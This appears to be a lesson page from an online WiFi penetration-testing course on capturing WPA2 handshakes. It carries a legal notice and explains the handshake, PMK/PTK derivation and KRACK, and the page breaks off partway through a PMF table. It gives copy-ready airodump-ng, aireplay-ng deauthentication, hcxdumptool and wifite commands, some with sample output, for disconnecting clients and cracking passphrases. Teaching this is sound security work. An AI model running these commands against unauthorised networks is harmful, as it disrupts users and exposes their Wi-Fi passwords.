<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Module 06 — WPA2 Handshake | WiFi Exploitation Course</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --bg:#0d1117; --bg-card:#161b22; --bg-code:#010409; --border:#30363d;
      --accent:#58a6ff; --accent2:#3fb950; --accent3:#f78166; --warn:#d29922;
      --text:#c9d1d9; --text-dim:#8b949e; --text-head:#e6edf3;
      --radius:8px; --font-mono:'Cascadia Code','Fira Code','Consolas',monospace;
      --font-body:'Segoe UI',system-ui,sans-serif;
    }
    html { scroll-behavior: smooth; }
    body { background:var(--bg); color:var(--text); font-family:var(--font-body); line-height:1.7; font-size:15px; }
    .page-wrapper { display:flex; min-height:100vh; }

    aside.sidebar { width:260px; min-width:260px; background:var(--bg-card); border-right:1px solid var(--border); padding:24px 0; position:sticky; top:0; height:100vh; overflow-y:auto; }
    .sidebar-logo { padding:0 20px 24px; border-bottom:1px solid var(--border); }
    .sidebar-logo .course-title { font-size:11px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); margin-bottom:6px; }
    .sidebar-logo h2 { font-size:14px; color:var(--accent); font-weight:600; }
    .sidebar-nav { padding:16px 0; }
    .sidebar-section-label { font-size:10px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); padding:12px 20px 6px; }
    .sidebar-nav a { display:flex; align-items:center; gap:10px; padding:7px 20px; color:var(--text-dim); text-decoration:none; font-size:13px; transition:all 0.15s; border-left:2px solid transparent; }
    .sidebar-nav a:hover { color:var(--text); background:rgba(88,166,255,0.05); }
    .sidebar-nav a.active { color:var(--accent); border-left-color:var(--accent); background:rgba(88,166,255,0.08); }
    .sidebar-nav a .mod-num { font-size:10px; background:var(--border); border-radius:4px; padding:2px 6px; font-family:var(--font-mono); min-width:28px; text-align:center; }
    .sidebar-nav a.active .mod-num { background:rgba(88,166,255,0.2); color:var(--accent); }

    main { flex:1; padding:48px 64px; max-width:960px; }

    .module-header { margin-bottom:40px; }
    .breadcrumb { font-size:12px; color:var(--text-dim); margin-bottom:12px; }
    .breadcrumb a { color:var(--accent); text-decoration:none; }
    .module-badge { display:inline-flex; align-items:center; gap:8px; background:rgba(88,166,255,0.12); border:1px solid rgba(88,166,255,0.3); border-radius:20px; padding:4px 14px; font-size:12px; color:var(--accent); margin-bottom:16px; }
    .module-header h1 { font-size:2.2rem; color:var(--text-head); line-height:1.2; margin-bottom:12px; }
    .module-header .subtitle { font-size:16px; color:var(--text-dim); max-width:640px; }
    .meta-row { display:flex; gap:24px; margin-top:20px; flex-wrap:wrap; }
    .meta-pill { display:flex; align-items:center; gap:6px; font-size:12px; color:var(--text-dim); }
    .meta-pill .dot { width:8px; height:8px; border-radius:50%; }

    .warning-box { background:rgba(210,153,34,0.08); border:1px solid rgba(210,153,34,0.4); border-radius:var(--radius); padding:16px 20px; margin-bottom:36px; display:flex; gap:12px; }
    .warning-box p { font-size:13px; color:var(--warn); line-height:1.6; }
    .warning-box strong { color:#e3b341; }

    section { margin-bottom:52px; }
    section h2 { font-size:1.35rem; color:var(--text-head); margin-bottom:16px; padding-bottom:8px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:10px; }
    section h2 .section-num { font-size:12px; color:var(--accent); font-family:var(--font-mono); background:rgba(88,166,255,0.1); border-radius:4px; padding:2px 8px; }
    section h3 { font-size:1.05rem; color:var(--text-head); margin:24px 0 10px; }
    p { margin-bottom:12px; }

    .terminal { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:16px 0; font-family:var(--font-mono); font-size:13px; }
    .terminal-bar { background:#161b22; border-bottom:1px solid var(--border); padding:8px 14px; display:flex; align-items:center; gap:10px; }
    .terminal-dots { display:flex; gap:6px; }
    .terminal-dots span { width:10px; height:10px; border-radius:50%; }
    .d-red { background:#f78166; } .d-yellow { background:#e3b341; } .d-green { background:#3fb950; }
    .terminal-title { font-size:11px; color:var(--text-dim); }
    .terminal-copy { margin-left:auto; background:none; border:1px solid var(--border); border-radius:4px; padding:3px 10px; color:var(--text-dim); font-size:11px; cursor:pointer; font-family:var(--font-body); transition:all 0.15s; }
    .terminal-copy:hover { border-color:var(--accent); color:var(--accent); }
    .terminal-copy.copied { border-color:var(--accent2); color:var(--accent2); }
    .terminal-body { padding:16px 18px; overflow-x:auto; line-height:1.9; color:#c9d1d9; white-space:pre-wrap; }
    .prompt { color:var(--accent2); user-select:none; }
    .cmd { color:#e6edf3; }
    .flag { color:#ffa657; }
    .str { color:#a5d6ff; }
    .cmt { color:#6e7681; font-style:italic; }
    .out { color:var(--text-dim); }
    .out-ok { color:var(--accent2); }
    .out-warn { color:var(--warn); }
    .out-err { color:var(--accent3); }

    .table-wrap { overflow-x:auto; margin:20px 0; border-radius:var(--radius); border:1px solid var(--border); }
    table { width:100%; border-collapse:collapse; font-size:13px; }
    thead tr { background:rgba(88,166,255,0.06); }
    th { padding:10px 14px; text-align:left; color:var(--accent); font-weight:600; font-size:11px; text-transform:uppercase; letter-spacing:0.8px; border-bottom:1px solid var(--border); }
    td { padding:10px 14px; border-bottom:1px solid rgba(48,54,61,0.6); vertical-align:top; }
    tr:last-child td { border-bottom:none; }
    tr:hover td { background:rgba(88,166,255,0.03); }
    code { font-family:var(--font-mono); font-size:12px; background:rgba(110,118,129,0.15); padding:2px 6px; border-radius:4px; color:#79c0ff; }

    .callout { border-radius:var(--radius); padding:14px 18px; margin:16px 0; display:flex; gap:12px; font-size:13px; line-height:1.6; }
    .callout.info { background:rgba(88,166,255,0.07); border-left:3px solid var(--accent); }
    .callout.attack { background:rgba(247,129,102,0.07); border-left:3px solid var(--accent3); }
    .callout.tip { background:rgba(63,185,80,0.07); border-left:3px solid var(--accent2); }
    .callout.warn { background:rgba(210,153,34,0.07); border-left:3px solid var(--warn); }
    .callout .ci { flex-shrink:0; font-size:16px; }
    .callout strong { color:var(--text-head); }

    /* Handshake diagram */
    .handshake-flow { display:flex; justify-content:space-between; align-items:center; margin:24px 0; flex-wrap:wrap; gap:16px; }
    .hs-msg { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; text-align:center; flex:1; min-width:150px; }
    .hs-msg h4 { font-size:12px; color:var(--text-head); margin-bottom:8px; }
    .hs-msg .num { display:inline-block; width:28px; height:28px; border-radius:50%; background:var(--accent); color:#0d1117; font-weight:bold; line-height:28px; margin-bottom:10px; font-size:14px; }
    .hs-msg .contents { font-size:11px; color:var(--text-dim); font-family:var(--font-mono); line-height:1.7; }
    .hs-arrow { color:var(--text-dim); font-size:24px; }
    .hs-ap { color:var(--accent2); }
    .hs-client { color:var(--accent); }

    /* Capture method cards */
    .capture-methods { display:grid; grid-template-columns:repeat(auto-fit,minmax(260px,1fr)); gap:16px; margin:20px 0; }
    .capture-card { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; }
    .capture-card h4 { font-size:14px; color:var(--text-head); margin-bottom:10px; }
    .capture-card .pros { font-size:12px; color:var(--accent2); margin-bottom:6px; }
    .capture-card .cons { font-size:12px; color:var(--accent3); }

    /* Capture simulator */
    .capture-sim { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:24px; margin:20px 0; }
    .capture-sim h3 { font-size:14px; color:var(--text-head); margin-bottom:16px; }
    .sim-controls { display:flex; gap:12px; margin-bottom:16px; flex-wrap:wrap; align-items:flex-end; }
    .sim-control { display:flex; flex-direction:column; gap:6px; }
    .sim-control label { font-size:11px; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.8px; }
    .sim-control select, .sim-control input { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:7px 12px; color:var(--text); font-size:13px; font-family:var(--font-body); outline:none; }
    .sim-control select:focus, .sim-control input:focus { border-color:var(--accent); }
    .sim-btn { padding:8px 20px; background:var(--accent); border:none; border-radius:6px; color:#0d1117; font-weight:700; font-size:13px; cursor:pointer; font-family:var(--font-body); transition:all 0.2s; height:36px; }
    .sim-btn:hover { background:#79c0ff; }
    .sim-output { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); padding:16px; font-family:var(--font-mono); font-size:12px; line-height:1.9; min-height:140px; white-space:pre-wrap; }
    .sim-spinner { display:inline-block; animation:spin 0.8s linear infinite; }
    @keyframes spin { to { transform:rotate(360deg); } }

    /* Nav footer */
    .nav-footer { display:flex; justify-content:space-between; align-items:center; padding:32px 0 0; border-top:1px solid var(--border); margin-top:48px; }
    .nav-btn { display:inline-flex; align-items:center; gap:8px; padding:10px 20px; border-radius:var(--radius); text-decoration:none; font-size:13px; font-weight:600; transition:all 0.2s; }
    .nav-btn.next { background:var(--accent); color:#0d1117; }
    .nav-btn.next:hover { background:#79c0ff; }
    .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
    .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }

    /* Quiz */
    .quiz-container { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:28px; margin:24px 0; }
    .quiz-container h3 { font-size:14px; color:var(--accent); margin-bottom:20px; display:flex; align-items:center; gap:8px; }
    .quiz-question { margin-bottom:28px; }
    .quiz-question .q-text { font-size:14px; color:var(--text-head); margin-bottom:14px; line-height:1.5; }
    .quiz-question .q-num { font-family:var(--font-mono); font-size:11px; color:var(--accent); margin-bottom:6px; }
    .option-list { display:flex; flex-direction:column; gap:8px; }
    .option-btn { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:10px 16px; color:var(--text); text-align:left; cursor:pointer; font-size:13px; transition:all 0.15s; font-family:var(--font-body); }
    .option-btn:hover { border-color:var(--accent); color:var(--text-head); }
    .option-btn.correct { border-color:var(--accent2); background:rgba(63,185,80,0.08); color:var(--accent2); }
    .option-btn.wrong { border-color:var(--accent3); background:rgba(247,129,102,0.08); color:var(--accent3); }
    .option-btn:disabled { cursor:default; }
    .quiz-feedback { margin-top:10px; font-size:13px; padding:10px 14px; border-radius:6px; display:none; line-height:1.5; }
    .quiz-feedback.show { display:block; }
    .quiz-feedback.correct-fb { background:rgba(63,185,80,0.08); border:1px solid rgba(63,185,80,0.3); color:var(--accent2); }
    .quiz-feedback.wrong-fb { background:rgba(247,129,102,0.08); border:1px solid rgba(247,129,102,0.3); color:var(--accent3); }
    .quiz-score { display:none; text-align:center; padding:20px; border-top:1px solid var(--border); margin-top:20px; }
    .quiz-score.show { display:block; }
    .score-num { font-size:3rem; font-weight:700; color:var(--accent); font-family:var(--font-mono); }
    .score-label { font-size:14px; color:var(--text-dim); margin-top:4px; }

    ::-webkit-scrollbar { width:6px; height:6px; }
    ::-webkit-scrollbar-track { background:var(--bg); }
    ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
    ::-webkit-scrollbar-thumb:hover { background:var(--text-dim); }

    @media (max-width:900px) { aside.sidebar { display:none; } main { padding:24px 20px; } }
  </style>
</head>
<body>
<div class="page-wrapper">

  <!-- Sidebar -->
  <aside class="sidebar">
    <div class="sidebar-logo">
      <div class="course-title">WiFi Exploitation Course</div>
      <h2>Wireless Security</h2>
    </div>
    <nav class="sidebar-nav">
      <div class="sidebar-section-label">Tier 1 — Foundations</div>
      <a href="../module-00-foundations/"><span class="mod-num">00</span> 802.11 Foundations</a>
      <a href="../module-01-linux-wireless-setup/"><span class="mod-num">01</span> Linux Wireless Setup</a>
      <a href="../module-02-monitor-mode/"><span class="mod-num">02</span> Monitor Mode</a>
      <div class="sidebar-section-label">Tier 2 — Recon</div>
      <a href="../module-03-reconnaissance/"><span class="mod-num">03</span> Reconnaissance</a>
      <a href="../module-04-packet-analysis/"><span class="mod-num">04</span> Packet Analysis</a>
      <div class="sidebar-section-label">Tier 3 — Legacy</div>
      <a href="../module-05-wep-cracking/"><span class="mod-num">05</span> WEP Cracking</a>
      <div class="sidebar-section-label">Tier 4 — WPA2-Personal</div>
      <a href="#" class="active"><span class="mod-num">06</span> WPA2 Handshake</a>
      <a href="../module-07-wpa2-cracking/"><span class="mod-num">07</span> WPA2 Cracking</a>
      <div class="sidebar-section-label">Tier 5 — Active Attacks</div>
      <a href="../module-08-deauth-dos/"><span class="mod-num">08</span> Deauth &amp; DoS</a>
      <div class="sidebar-section-label">Tier 6 — Rogue AP</div>
      <a href="../module-09-evil-twin/"><span class="mod-num">09</span> Evil Twin</a>
      <a href="../module-10-captive-portal/"><span class="mod-num">10</span> Captive Portal</a>
      <div class="sidebar-section-label">Tier 7 — WPS</div>
      <a href="../module-11-wps-attacks/"><span class="mod-num">11</span> WPS Attacks</a>
      <div class="sidebar-section-label">Tier 8 — Modern</div>
      <a href="../module-12-pmkid-attack/"><span class="mod-num">12</span> PMKID Attack</a>
      <a href="../module-13-enterprise-wpa/"><span class="mod-num">13</span> WPA-Enterprise</a>
      <div class="sidebar-section-label">Tier 9 — Chaining</div>
      <a href="../module-14-attack-chaining/"><span class="mod-num">14</span> Attack Chaining</a>
    </nav>
  </aside>

  <main>
    <div class="module-header">
      <div class="breadcrumb"><a href="../">WiFi Exploitation Course</a> / Module 06</div>
      <div class="module-badge">&#9679; Tier 4 &mdash; WPA2-Personal</div>
      <h1>Capturing the WPA2 4-Way Handshake</h1>
      <p class="subtitle">Learn to capture the WPA2 handshake — the critical first step for offline password cracking. Covers passive and active capture techniques, deauthentication attacks, and verification methods.</p>
      <div class="meta-row">
        <div class="meta-pill"><span class="dot" style="background:#3fb950"></span> Beginner</div>
        <div class="meta-pill"><span class="dot" style="background:#58a6ff"></span> ~40 min</div>
        <div class="meta-pill"><span class="dot" style="background:#f78166"></span> Adapter required</div>
      </div>
    </div>

    <div class="warning-box">
      <p><strong>Legal Notice:</strong> Handshake capture techniques must only be used on networks you own or have explicit written authorization to test. Deauthentication attacks are considered active reconnaissance and may be illegal in your jurisdiction.</p>
    </div>

    <!-- Section 1: The Handshake -->
    <section id="handshake">
      <h2><span class="section-num">01</span> The 4-Way Handshake Explained</h2>
      <p>The handshake establishes session keys without transmitting the password. Each message serves a specific purpose:</p>

      <div class="handshake-flow">
        <div class="hs-msg">
          <div class="num">1</div>
          <h4><span class="hs-ap">AP</span> &#8594; Client</h4>
          <div class="contents">ANonce<br>(random value)</div>
        </div>
        <div class="hs-arrow">&#8594;</div>
        <div class="hs-msg">
          <div class="num">2</div>
          <h4><span class="hs-client">Client</span> &#8594; AP</h4>
          <div class="contents">SNonce + MIC<br>+ RSN IE</div>
        </div>
        <div class="hs-arrow">&#8594;</div>
        <div class="hs-msg">
          <div class="num">3</div>
          <h4><span class="hs-ap">AP</span> &#8594; Client</h4>
          <div class="contents">ANonce + GTK<br>+ MIC</div>
        </div>
        <div class="hs-arrow">&#8594;</div>
        <div class="hs-msg">
          <div class="num">4</div>
          <h4><span class="hs-client">Client</span> &#8594; AP</h4>
          <div class="contents">Confirm<br>+ MIC</div>
        </div>
      </div>

      <div class="callout info">
        <span class="ci">&#128269;</span>
        <div><strong>Why it can be cracked:</strong> The handshake contains public values (nonces) and a MIC (Message Integrity Code). By trying passwords offline, we can derive the PMK and compute the MIC to verify if a password is correct.</div>
      </div>
    </section>

    <!-- Section 2: Capture Methods -->
    <section id="methods">
      <h2><span class="section-num">02</span> Handshake Capture Methods</h2>

      <div class="capture-methods">
        <div class="capture-card">
          <h4>&#128129; Passive Capture</h4>
          <div class="pros">+ Completely stealthy</div>
          <div class="pros">+ No frames transmitted</div>
          <div class="cons">- Can take very long</div>
          <p style="margin-top:12px;font-size:12px;">Wait for a client to naturally connect. Use when you have time and need stealth.</p>
        </div>
        
        <div class="capture-card">
          <h4>&#9889; Deauth Attack</h4>
          <div class="pros">+ Fast (seconds)</div>
          <div class="pros">+ Reliable</div>
          <div class="cons">- Active/visible</div>
          <p style="margin-top:12px;font-size:12px;">Force clients to reconnect by sending deauthentication frames. Most common method.</p>
        </div>

        <div class="capture-card">
          <h4>&#128268; hcxdumptool</h4>
          <div class="pros">+ Captures PMKID too</div>
          <div class="pros">+ Modern, efficient</div>
          <div class="cons">- Requires new tool</div>
          <p style="margin-top:12px;font-size:12px;">Advanced tool for capturing handshakes and PMKIDs in various formats.</p>
        </div>
      </div>
    </section>

    <!-- Section 3: Commands -->
    <section id="commands">
      <h2><span class="section-num">03</span> Capture Commands</h2>
      <p>Execute these commands in separate terminals for best results.</p>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">Terminal 1: Start capture</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-cap1')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-cap1"><span class="cmt"># Target specific WPA2 network and capture handshakes</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airodump-ng <span class="flag">--bssid</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-c</span> <span class="str">6</span> <span class="flag">-w</span> <span class="str">handshake</span> wlan0mon</span></div>
      </div>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">Terminal 2: Send deauth (in new terminal)</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-cap2')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-cap2"><span class="cmt"># Broadcast deauth - disconnects everyone</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--deauth</span> <span class="str">10</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> wlan0mon</span>

<span class="cmt"># Or target specific client</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--deauth</span> <span class="str">10</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-c</span> <span class="str">11:22:33:44:55:66</span> wlan0mon</span></div>
      </div>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">Verify handshake</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-cap3')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-cap3"><span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aircrack-ng <span class="str">handshake-01.cap</span></span>
<span class="out">Opening handshake-01.cap</span>
<span class="out">Read 1524 packets.</span>
<span class="out">#  BSSID              ESSID         Encryption</span>
<span class="out-ok">1  AA:BB:CC:DD:EE:FF  MyNetwork    WPA2 (1) handshake</span></div>
      </div>
    </section>

    <!-- Section 4: Simulator -->
    <section id="simulator">
      <h2><span class="section-num">04</span> Handshake Capture Simulator</h2>
      <p>Configure and simulate a handshake capture scenario.</p>

      <div class="capture-sim">
        <h3>&#128301; Handshake Capture Simulation</h3>
        <div class="sim-controls">
          <div class="sim-control">
            <label>Capture Method</label>
            <select id="capMethod">
              <option value="passive">Passive (wait for client)</option>
              <option value="deauth">Deauth Attack</option>
              <option value="hcx">hcxdumptool</option>
            </select>
          </div>
          <div class="sim-control">
            <label>Client Status</label>
            <select id="capClient">
              <option value="connected">Client connected</option>
              <option value="none">No clients nearby</option>
            </select>
          </div>
          <button class="sim-btn" onclick="runCaptureSim()">Capture Handshake</button>
        </div>
        <div class="sim-output" id="simOutput"><span style="color:var(--text-dim);">Configure options above and click "Capture Handshake"...</span></div>
      </div>
    </section>

    <!-- Section 5: Key Derivation -->
    <section id="keys">
      <h2><span class="section-num">05</span> Key Derivation — PMK &amp; PTK</h2>
      <p>Understanding how keys are derived is essential for understanding why capturing the handshake enables offline cracking.</p>

      <div class="table-wrap">
        <table>
          <thead><tr><th>Key</th><th>Derived From</th><th>Purpose</th><th>Cracking Role</th></tr></thead>
          <tbody>
            <tr>
              <td><code>PMK</code></td>
              <td><code>PBKDF2(HMAC-SHA1, passphrase, SSID, 4096 iters, 256 bits)</code></td>
              <td>Root key — never transmitted</td>
              <td>Brute-forced per candidate password</td>
            </tr>
            <tr>
              <td><code>PTK</code></td>
              <td><code>PRF-512(PMK, "Pairwise key expansion", AP_MAC, STA_MAC, ANonce, SNonce)</code></td>
              <td>Session encryption key</td>
              <td>Derived from candidate PMK using captured nonces</td>
            </tr>
            <tr>
              <td><code>KCK</code></td>
              <td>PTK[0:16] (first 128 bits)</td>
              <td>Computes EAPOL MIC</td>
              <td><strong>Used to verify candidate password</strong> — compare against captured MIC</td>
            </tr>
            <tr>
              <td><code>KEK</code></td>
              <td>PTK[16:32]</td>
              <td>Encrypts GTK in M3</td>
              <td>Not needed for cracking</td>
            </tr>
            <tr>
              <td><code>TK</code></td>
              <td>PTK[32:64]</td>
              <td>AES-CCMP data encryption</td>
              <td>Recovered after cracking → decrypt traffic</td>
            </tr>
          </tbody>
        </table>
      </div>

      <div class="callout attack">
        <span class="ci">&#9889;</span>
        <div><strong>The cracking loop:</strong> For each candidate password → derive PMK → derive PTK → extract KCK → compute MIC → compare with captured MIC. If they match: password found. This runs entirely offline — no AP interaction needed after capture. CPU: ~650 candidates/sec. GPU (RTX 4090): ~1.9 million/sec.</div>
      </div>
    </section>

    <!-- Section 6: Full Command Reference -->
    <section id="full-cmds">
      <h2><span class="section-num">06</span> Full Command Reference</h2>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">aireplay-ng --deauth — all flags explained</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-deauth-full')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-deauth-full"><span class="cmt"># Broadcast deauth (kicks ALL clients)</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--deauth</span> <span class="str">5</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> wlan0mon</span>
<span class="cmt"># --deauth 5 / -0 5  → send 5 deauth frames then stop (use 0 for infinite)</span>
<span class="cmt"># -a <BSSID>          → AP BSSID used as spoofed source MAC of the deauth</span>

<span class="cmt"># Targeted deauth (single client — more precise)</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--deauth</span> <span class="str">5</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-c</span> <span class="str">11:22:33:44:55:66</span> wlan0mon</span>
<span class="cmt"># -c <MAC>            → target this specific client (omit for broadcast)</span>

<span class="cmt"># Fix "Fixed channel wlan0mon: -1" channel mismatch error</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--deauth</span> <span class="str">5</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">--ignore-negative-one</span> wlan0mon</span>
<span class="cmt"># --ignore-negative-one → ignore channel -1 error (forces injection anyway)</span></div>
      </div>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">hcxdumptool v6+ correct flags</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-hcx-full')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-hcx-full"><span class="cmt"># Basic capture (--enable_status=1 is REQUIRED in v6+)</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo hcxdumptool <span class="flag">-i</span> wlan0mon <span class="flag">-o</span> <span class="str">capture.pcapng</span> <span class="flag">--enable_status=1</span></span>
<span class="cmt"># -i wlan0mon         → monitor mode interface</span>
<span class="cmt"># -o capture.pcapng   → output (MUST be .pcapng, not .cap)</span>
<span class="cmt"># --enable_status=1   → required v6+ (1=minimal, 3=verbose, without it: silent exit)</span>

<span class="cmt"># Target specific AP only</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">echo <span class="str">"AA:BB:CC:DD:EE:FF"</span> > target.txt && sudo hcxdumptool <span class="flag">-i</span> wlan0mon <span class="flag">-o</span> <span class="str">capture.pcapng</span> <span class="flag">--enable_status=1</span> <span class="flag">--filtermode=1</span> <span class="flag">--filterlist_ap=target.txt</span></span>
<span class="cmt"># --filtermode=1       → only capture APs in filterlist</span>
<span class="cmt"># --filtermode=2       → capture ALL except listed (exclusion mode)</span>
<span class="cmt"># --filterlist_ap=file → file with one BSSID per line</span>

<span class="cmt"># Check what was captured</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">hcxpcapngtool <span class="flag">--info</span> capture.pcapng</span>
<span class="out-ok">M1M2 pairs: 1    M1M2M3M4 pairs: 0    PMKIDs: 3</span>

<span class="cmt"># Convert to hashcat -m 22000 format</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">hcxpcapngtool <span class="flag">-o</span> <span class="str">hashes.hc22000</span> capture.pcapng</span>
<span class="out-ok">1 hash written to hashes.hc22000</span></div>
      </div>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">Partial handshake recovery — mergecap</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-merge')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-merge"><span class="cmt"># Check which EAPOL messages you have</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">tshark <span class="flag">-r</span> capture-01.cap <span class="flag">-Y</span> <span class="str">"eapol"</span> <span class="flag">-T</span> fields <span class="flag">-e</span> eapol.keydes.msgnr | sort | uniq -c</span>
<span class="out">   1 1    ← M1 captured</span>
<span class="out">   1 2    ← M2 captured  → M1+M2 = CRACKABLE</span>

<span class="cmt"># Merge multiple partial capture files into one</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">mergecap <span class="flag">-a</span> <span class="flag">-F</span> pcap <span class="flag">-w</span> <span class="str">merged.cap</span> capture-01.cap capture-02.cap capture-03.cap</span>
<span class="cmt"># -a = append in chronological order</span>
<span class="cmt"># -F pcap = output format (Wireshark suite tool)</span>
<span class="cmt"># Useful when multiple deauths each captured different EAPOL messages</span>

<span class="cmt"># Verify merged capture</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">aircrack-ng merged.cap</span>
<span class="out-ok">1  AA:BB:CC:DD:EE:FF  MyNetwork    WPA2 (2) handshake</span></div>
      </div>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">wifite — automated handshake capture</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-wifite')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-wifite"><span class="cmt"># Automated WPA2 attack: scan → select → deauth → capture → verify</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo wifite <span class="flag">--wpa</span> <span class="flag">--kill</span></span>
<span class="cmt"># --wpa    → only attack WPA/WPA2 (skip WEP)</span>
<span class="cmt"># --kill   → kill interfering processes before starting</span>

<span class="cmt"># Target specific AP and attempt crack with rockyou.txt</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo wifite <span class="flag">--bssid</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">--dict</span> <span class="str">/usr/share/wordlists/rockyou.txt</span></span>
<span class="cmt"># --bssid  → target this AP only</span>
<span class="cmt"># --dict   → attempt crack after capture with this wordlist</span>
<span class="cmt"># --pmkid  → use PMKID attack instead of handshake (no deauth needed)</span>
<span class="cmt"># Captures saved to: ./cracked/ directory</span></div>
      </div>
    </section>

    <!-- Section 7: KRACK -->
    <section id="krack">
      <h2><span class="section-num">07</span> KRACK — Key Reinstallation Attack</h2>
      <p>
        KRACK (CVE-2017-13077) is a critical vulnerability in the WPA2 4-way handshake <strong>state machine</strong>.
        It does not break AES-CCMP — it forces nonce reuse by replaying Message 3.
      </p>

      <div class="callout attack">
        <span class="ci">&#9888;</span>
        <div><strong>CVE-2017-13077:</strong> By blocking the client's M4 ACK and replaying M3, an attacker forces the client to reinstall the PTK — resetting the CCMP Packet Number (PN) to 0. With the same nonce, AES-CTR generates the same keystream twice → XOR two ciphertexts = XOR of plaintexts → plaintext recovery.</div>
      </div>

      <div class="table-wrap">
        <table>
          <thead><tr><th>CVE</th><th>Target</th><th>Impact</th></tr></thead>
          <tbody>
            <tr><td><code>CVE-2017-13077</code></td><td>PTK (4-way M3 replay)</td><td>Nonce reuse in unicast data encryption</td></tr>
            <tr><td><code>CVE-2017-13078</code></td><td>GTK (group key)</td><td>Nonce reuse in multicast/broadcast decryption</td></tr>
            <tr><td><code>CVE-2017-13079</code></td><td>IGTK (802.11w)</td><td>Nonce reuse in protected management frames</td></tr>
            <tr><td><code>CVE-2017-13086</code></td><td>PeerKey HS</td><td>Direct peer-to-peer link nonce reuse</td></tr>
          </tbody>
        </table>
      </div>

      <div class="callout info">
        <span class="ci">&#128161;</span>
        <div><strong>Patch status:</strong> All major OS vendors patched KRACK by late 2017. However, many embedded IoT devices, industrial controllers, and older routers remain unpatched. In real engagements, always check for unpatched embedded devices.</div>
      </div>
    </section>

    <!-- Section 8: PMF / 802.11w -->
    <section id="pmf">
      <h2><span class="section-num">08</span> 802.11w (PMF) — When Deauth Is Blocked</h2>
      <p>
        When <strong>Management Frame Protection (802.11w / PMF)</strong> is required on the AP,
        forged deauth frames are rejected by the client. WPA3 mandates PMF; WPA2 can optionally enable it.
      </p>

      <div class="table-wrap">
        <table>
          <thead><tr><th>PMF Status</th><th>Effect on Deauth Attack</th><th>Workaround</th></tr></thead>
          <tbody>
            <tr><td>Disabled</td><td style="color:var(--accent2)">Deauth works normally</td><td>—</td></tr>
